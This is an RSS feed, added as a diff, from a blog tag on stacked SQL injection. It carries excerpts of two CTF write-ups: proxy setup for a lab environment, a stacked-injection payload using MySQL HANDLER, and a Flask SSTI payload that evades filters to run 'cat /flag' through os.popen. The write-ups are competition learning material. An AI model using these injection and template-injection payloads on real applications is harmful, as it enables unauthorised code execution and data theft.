@@ -1,0 +1,55 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>堆叠注入 on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</link>
+    <description>Recent content in 堆叠注入 on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 18 May 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SWPU2019 复现</title>
+      <link>https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Web2 考点：redis弱口令，python反序列化
+BUU上面的环境需要 Shadowsocks 代理才能访问，配置这个都搞了半天（tcl
+下载配置shadowsocks sudo apt-get install shadowsocks连接代理 sslocal -s node3.buuoj.cn -p 11111 -k 123456报错：AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup
+报错参考：https://www.jianshu.com/p/3f874d5aac54
+在Python2.7中的openssl文件中,下面这个函数没有定义,具体就是这个:
+EVP_CIPHER_CTX_cleanup更深层的是是由于在openssl1.1.0版本中，废弃了 EVP_CIPHER_CTX_cleanup 函数,要用这个函数 EVP_CIPHER_CTX_reset() 代替;
+直接 vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py 打开文件，全局搜索关键字替换即可；
+kali下编译安装proxychains4 编译安装 git clone https://github.com/rofl0r/proxychains-ng.git # downloadcd proxychains-ng./configuresudo make sudo make installcp ./src/proxychains.conf /etc/proxychains.conf # config file用proxychains做正向代理 vim /etc/proxychains.conf添加一行：socks5 127.0.0.1 1080（具体取决于你的ss配置的端口）
+不过我这里需要注释掉原来的那一行 socks4 127.0.0.1 9050
+命令行访问内网 proxychains4 ping web 只需在前面加 proxychains4 就行了</description>
+    </item>
+    
+    <item>
+      <title>MiniL2020_web_wp</title>
+      <link>https://anthem-whisper.github.io/p/minil2020_web_wp/</link>
+      <pubDate>Sun, 10 May 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/minil2020_web_wp/</guid>
+      <description>西电校赛，难度适中，本人内鬼选手，看了下题。
+ id_wife 考点：堆叠注入
+不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生
+测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭
+frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}
+Personal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。
+学习链接
+&amp;gt;&amp;gt;flag0师傅
+&amp;gt;&amp;gt;byc_404师傅
+打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI
+输入 {{2+2}} 之后回显的 4 实锤。
+Fuzz，过滤了下划线、单双引号、没有过滤中括号
+最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出
+在class中寻找模块exp：
+#python 3import restr = &#39;&#39;&#39;（回显信息）&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):if &#39;catch_warnings&#39; in list[i]:print(i)breakplayload：
+?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat+/flag&#39;).read()X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}复现时补充：
+我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：
+XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}//回显：Your IP: &amp;lt;class &#39;os.</description>
+    </item>
+    
+  </channel>
+</rss>
